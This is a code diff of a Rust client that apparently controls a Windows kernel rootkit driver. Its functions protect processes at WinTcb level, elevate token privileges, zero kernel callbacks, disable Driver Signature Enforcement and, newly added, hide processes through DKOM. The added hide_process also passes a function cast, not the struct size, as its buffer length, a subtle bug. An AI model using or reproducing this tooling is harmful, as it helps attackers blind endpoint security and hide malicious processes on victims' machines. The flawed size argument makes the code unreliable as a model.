@@ -1,6 +1,6 @@
 use std::{mem::size_of, ptr::null_mut};
 use winapi::{um::{ioapiset::DeviceIoControl}, ctypes::c_void};
-use common::{TargetProcess, IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, CallBackInformation, TargetCallback, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, DriverSignatureEnforcement};
+use common::{TargetProcess, IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, CallBackInformation, TargetCallback, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, DriverSignatureEnforcement, IOCTL_PROCESS_HIDE_REQUEST};
 
 /// Protect a process as PsProtectedSignerWinTcb
 pub fn protect_process(process_id: u32, driver_handle: *mut c_void) {
@@ -24,9 +24,11 @@ pub fn protect_process(process_id: u32, driver_handle: *mut c_void) {
     if device_io_control_result == 0 {
         panic!("[-] Failed to call DeviceIoControl");
     }
+
+    println!("[+] Process protected successfully {:?}", target_process.process_id);
 }
 
-/// Remove the protection of a process
+/// Remove process protection
 pub fn unprotect_process(process_id: u32, driver_handle: *mut c_void) {
     let mut bytes: u32 = 0;
     
@@ -48,9 +50,11 @@ pub fn unprotect_process(process_id: u32, driver_handle: *mut c_void) {
     if device_io_control_result == 0 {
         panic!("[-] Failed to call DeviceIoControl");
     }
+
+    println!("[+] Process unprotected successfully {:?}", target_process.process_id);
 }
 
-/// Remove the protection of a process
+/// Enable / elevate all token privileges of a process
 pub fn enable_tokens(process_id: u32, driver_handle: *mut c_void) {
     let mut bytes: u32 = 0;
     
@@ -72,6 +76,8 @@ pub fn enable_tokens(process_id: u32, driver_handle: *mut c_void) {
     if device_io_control_result == 0 {
         panic!("[-] Failed to call DeviceIoControl");
     }
+
+    println!("[+] Tokens privileges elevated successfully {:?}", target_process.process_id);
 }
 
 /// Enumerate Kernel Callbacks
@@ -128,6 +134,8 @@ pub fn patch_callback(index: u32, driver_handle: *mut c_void) {
     if device_io_control_result == 0 {
         panic!("[-] Failed to call DeviceIoControl");
     }
+
+    println!("[+] Callback patched successfully at index {:?}", target.index);
 }
 
 /// Enable Driver Signature Enforcement (DSE)
@@ -167,4 +175,31 @@ pub fn enable_or_disable_dse(driver_handle: *mut c_void, dse_state: bool) {
     } else {
         println!("[+] Driver Signature Enforcement (DSE) disabled: {:#x}", dse.address);
     }
+}
+
+
+/// Hide a process using Direct Kernel Object Manipulation (DKOM)
+pub fn hide_process(process_id: u32, driver_handle: *mut c_void) {
+    let mut bytes: u32 = 0;
+    
+    let mut target_process = TargetProcess {
+        process_id: process_id,
+    };
+    
+    let device_io_control_result = unsafe { 
+        DeviceIoControl(driver_handle,
+        IOCTL_PROCESS_HIDE_REQUEST,
+        &mut target_process as *mut _ as *mut c_void,
+        size_of::<TargetProcess> as u32,
+        null_mut(),
+        0,
+        &mut bytes,
+        null_mut())
+    };
+
+    if device_io_control_result == 0 {
+        panic!("[-] Failed to call DeviceIoControl");
+    }
+
+    println!("[+] Process is hidden successfully: {:?}", target_process.process_id);
 }
